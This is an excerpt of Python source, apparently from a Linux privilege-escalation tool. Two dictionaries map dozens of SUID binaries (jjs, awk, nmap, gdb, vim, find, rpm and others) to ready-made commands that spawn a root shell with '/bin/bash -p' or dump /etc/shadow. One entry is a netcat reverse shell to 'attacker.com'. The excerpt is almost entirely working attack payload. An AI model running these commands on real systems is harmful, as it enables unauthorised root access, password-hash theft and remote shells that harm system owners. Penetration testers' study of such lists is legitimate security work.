...
customSUIDs = {
	...
	'jjs': 'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/bash -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()" | ./jjs',
	...
	'mysql': "./mysql -e '\\! /bin/bash'", 'awk': './awk \'BEGIN {system("/bin/bash")}\'',
	'nano': './nano\n^R^X\nreset; sh 1>&0 2>&0',
	'nawk': './nawk \'BEGIN {system("/bin/bash")}\'',
	'nc': 'RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/bash $RHOST $RPORT',
	'nmap': 'TF=$(mktemp)\necho \'os.execute("/bin/bash")\' > $TF\n./nmap --script=$TF',
	'nohup': 'nohup /bin/bash -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"',
...
suidExploitation = {
	...
	'env': '/bin/bash -p',
	'expand': '/etc/shadow',
	'expect': '-c "spawn /bin/bash -p;interact"',
	'find': '. -exec /bin/bash -p \\; -quit',
	'flock': '-u / /bin/bash -p',
	'fold': '-w99999999 /etc/shadow',
	'gawk': '\'BEGIN {system("/bin/bash")}\'',
	'gdb': '-q -nx -ex \'python import os; os.execl("/bin/bash", "sh", "-p")\' -ex quit',
	'gimp': '-idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/bash", "sh", "-p")\'',
	'grep': '"" /etc/shadow',
	'head': '-c2G /etc/shadow',
	'ionice': '/bin/bash -p',
	...
	'rlwrap': '-H /dev/null /bin/bash -p',
	'rpm': '--eval \'%{lua:os.execute("/bin/bash", "-p")}\'',
	'rpmquery': '--eval \'%{lua:posix.exec("/bin/bash", "-p")}\'',
	'rsync': '-e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
	'run-parts': '--new-session --regex \'^sh$\' /bin --arg=\'-p\'',
	'rvim': '-c \':py import os; os.execl("/bin/bash", "sh", "-pc", "reset; exec sh -p")\'',
	'sed': '-e "" /etc/shadow',
	'setarch': '$(arch) /bin/bash -p',
	'sort': '-m /etc/shadow',
	'start-stop-daemon': '-n $RANDOM -S -x /bin/bash -- -p',
	...
	'uniq': '/etc/shadow',
	'unshare': '-r /bin/bash',
	'vim': '-c \':py import os; os.execl("/bin/bash", "sh", "-pc", "reset; exec sh -p")\'',
